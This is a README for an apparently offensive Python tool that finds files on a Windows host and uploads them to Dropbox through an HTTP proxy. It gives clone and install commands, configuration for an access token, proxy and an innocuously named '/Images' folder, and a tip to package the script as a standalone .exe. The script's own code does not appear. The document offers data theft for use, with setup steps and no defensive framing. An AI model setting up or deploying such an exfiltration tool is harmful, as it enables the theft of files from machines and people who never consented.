# Data Exfiltration Proxy
Script for discovering and uploading any files on a Windows host to Dropbox over HTTPS using a proxy.

## Prerequisites

### System Requirements

- Windows 10 / 11
- Python 3.8+

### Accounts & Credentials

- **Dropbox API App** with an access token.
- Proxy host/port to HTTP Tunneling

---

## Installation

Clone and prepare your environment:

```bash
git clone https://github.com/alexoslabs2/data-exfiltration-proxy.git
cd data-exfiltration-proxy
pip install dropbox requests[socks]
```

### Configuration

```bash
ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN'
PROXY_URL = 'http://[Proxy IP]:3128'
DROPBOX_FOLDER = '/Images'
```

Tip: Create a Windows .exe

1) Install PyInstaller

```bash
pip install pyinstaller
```

3) Build the Executable
```bash
pyinstaller --onefile your_script.py
```
